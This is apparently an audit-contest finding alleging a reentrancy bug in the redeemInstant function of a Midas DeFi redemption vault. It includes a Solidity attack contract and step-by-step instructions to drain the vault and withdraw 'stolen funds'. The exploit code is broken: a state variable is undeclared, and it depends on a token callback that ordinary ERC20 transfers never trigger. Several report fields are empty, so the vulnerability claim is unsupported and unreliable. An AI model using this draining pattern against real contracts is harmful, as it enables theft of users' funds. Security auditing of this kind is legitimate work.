# Reentrancy Attacks at redeemInstant  function for MBasisRedemptionVaultWithSwapper  contract

### Summary

Line: https://github.com/sherlock-audit/2024-08-midas-minter-redeemer/blob/main/midas-contracts/contracts/mBasis/MBasisRedemptionVaultWithSwapper.sol#L88

The contract contains functions that transfer tokens to external addresses and then perform additional logic afterward. 

### Root Cause

Lack of reentrancy guard

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Attacker can re-enter the contract and manipulate its state.

import "./MBasisRedemptionVaultWithSwapper.sol"; // Assuming this is the contract file with the target function
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ReentrancyAttack {

    IERC20 public token;
    address public attacker;

    constructor(address _targetContract, address _token) {
        targetContract = MBasisRedemptionVaultWithSwapper(_targetContract);
        token = IERC20(_token);
        attacker = msg.sender;
    }

    function initiateAttack(uint256 amountMTokenIn) external {
        // Approve the target contract to spend tokens
        token.approve(address(targetContract), amountMTokenIn);

        // Trigger the reentrancy by calling redeemInstant
        targetContract.redeemInstant(address(token), amountMTokenIn, 1);
    }

    function onERC20Received(
        address, /*operator*/
        address, /*from*/
        uint256, /*value*/
        bytes calldata /*data*/
    ) external returns (bytes4) {
        // Re-enter the redeemInstant function
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            targetContract.redeemInstant(address(token), balance, 1);
        }

        return this.onERC20Received.selector;
    }

    // Fallback function to receive Ether
    receive() external payable {}

    // Withdraw stolen funds
    function withdraw() external {
        require(msg.sender == attacker, "Not the attacker");
        payable(attacker).transfer(address(this).balance);
        token.transfer(attacker, token.balanceOf(address(this)));
    }
}
```
Step 2: Explanation
initiateAttack: This function begins the attack by calling the redeemInstant function on the target contract. It passes the amount of tokens the attacker intends to use.

onERC20Received: This function is triggered when the target contract sends tokens back to the malicious contract. It immediately calls redeemInstant again, exploiting the reentrancy vulnerability. The loop continues until the contract runs out of tokens or gas.

withdraw: This function allows the attacker to withdraw all the stolen funds after the attack is complete.

Step 3: Deploy and Execute the Attack
Deploy the ReentrancyAttack contract by providing the target contract address (MBasisRedemptionVaultWithSwapper) and the token address.
Fund the ReentrancyAttack contract with the tokens needed for the attack.
Call the initiateAttack function from the attacker's address.
The contract will recursively call redeemInstant, draining the target contract's tokens.
After the attack, call withdraw to transfer the stolen funds to the attacker's address.

### Mitigation

Use the ReentrancyGuard modifier from OpenZeppelin to prevent reentrancy, or carefully order state changes and external calls to follow the "checks-effects-interactions" pattern.
